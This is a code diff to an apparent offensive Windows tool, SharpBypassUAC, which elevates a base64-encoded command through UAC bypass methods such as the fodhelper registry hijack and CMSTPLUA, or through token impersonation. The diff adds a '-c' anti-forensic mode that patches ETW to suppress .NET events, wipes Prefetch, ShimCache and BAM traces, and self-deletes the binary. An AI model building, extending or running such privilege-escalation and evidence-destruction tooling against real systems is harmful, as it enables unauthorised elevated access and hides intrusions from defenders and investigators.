@@ -10,7 +10,7 @@ namespace SharpBypassUAC
             Console.WriteLine("SharpBypassUAC - UAC Bypass & Token Impersonation");
             Console.WriteLine();
             Console.WriteLine("UAC Bypass:");
-            Console.WriteLine("  SharpBypassUAC.exe -b <method> -e <base64command>");
+            Console.WriteLine("  SharpBypassUAC.exe -b <method> -e <base64command> [-c]");
             Console.WriteLine();
             Console.WriteLine("  Methods:");
             Console.WriteLine("    fodhelper        ms-settings registry hijack via fodhelper.exe");
@@ -23,18 +23,20 @@ namespace SharpBypassUAC
             Console.WriteLine("    cmstp            CMSTPLUA COM elevation (no registry modification)");
             Console.WriteLine();
             Console.WriteLine("Token Impersonation:");
-            Console.WriteLine("  SharpBypassUAC.exe -t <pid> -e <base64command>");
+            Console.WriteLine("  SharpBypassUAC.exe -t <pid> -e <base64command> [-c]");
             Console.WriteLine();
             Console.WriteLine("Options:");
             Console.WriteLine("  -b <method>   UAC bypass method to use");
             Console.WriteLine("  -t <pid>      Impersonate token from target process (requires local admin)");
             Console.WriteLine("  -e <base64>   Base64-encoded command to execute");
+            Console.WriteLine("  -c            Anti-forensic cleanup (ETW patch, Prefetch/ShimCache/BAM wipe, self-delete)");
             Console.WriteLine("  -h            Show this help");
             Console.WriteLine();
             Console.WriteLine("Examples:");
             Console.WriteLine("  SharpBypassUAC.exe -b fodhelper -e <base64(cmd.exe /c whoami > C:\\out.txt)>");
-            Console.WriteLine("  SharpBypassUAC.exe -b cmstp -e <base64(powershell.exe -enc ...)>");
-            Console.WriteLine("  SharpBypassUAC.exe -t 624 -e <base64(cmd.exe /c whoami)>");
+            Console.WriteLine("  SharpBypassUAC.exe -b fodhelper -e <base64(cmd.exe)> -c");
+            Console.WriteLine("  SharpBypassUAC.exe -b cmstp -e <base64(powershell.exe -enc ...)> -c");
+            Console.WriteLine("  SharpBypassUAC.exe -t 624 -e <base64(cmd.exe /c whoami)> -c");
         }
 
         static void Main(string[] args)
@@ -43,6 +45,7 @@ namespace SharpBypassUAC
             string encodedStr = null;
             int targetPid = -1;
             bool help = false;
+            bool cleanup = false;
 
             for (int i = 0; i < args.Length; i++)
             {
@@ -67,6 +70,10 @@ namespace SharpBypassUAC
                         return;
                     }
                 }
+                else if (arg == "-c" || arg == "--clean")
+                {
+                    cleanup = true;
+                }
             }
 
             if (help || (bypass == null && targetPid == -1))
@@ -90,6 +97,19 @@ namespace SharpBypassUAC
             {
                 Console.WriteLine("[!] Invalid base64 string");
                 return;
+            }
+
+            // If cleanup requested, patch ETW first to suppress .NET CLR events
+            // from this process BEFORE performing the bypass
+            string selfPath = null;
+            if (cleanup)
+            {
+                try
+                {
+                    selfPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                }
+                catch { }
+                AntiForensic.RunLight(selfPath);
             }
 
             try
@@ -132,6 +152,28 @@ namespace SharpBypassUAC
                             PrintHelp();
                             break;
                     }
+                }
+
+                // Post-bypass cleanup: full anti-forensic sweep
+                // The bypass elevated our payload, but this process may still
+                // be medium integrity. The elevated child should run its own
+                // full cleanup. Here we do what we can at current integrity.
+                if (cleanup && selfPath != null)
+                {
+                    // Check if we have high integrity (token impersonation gives it)
+                    bool isElevated = false;
+                    try
+                    {
+                        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                        var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                        isElevated = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+                    }
+                    catch { }
+
+                    if (isElevated)
+                        AntiForensic.Run(selfPath, true);
+                    else
+                        Console.WriteLine("[*] Medium integrity: full cleanup requires elevated context");
                 }
             }
             catch (Exception ex)
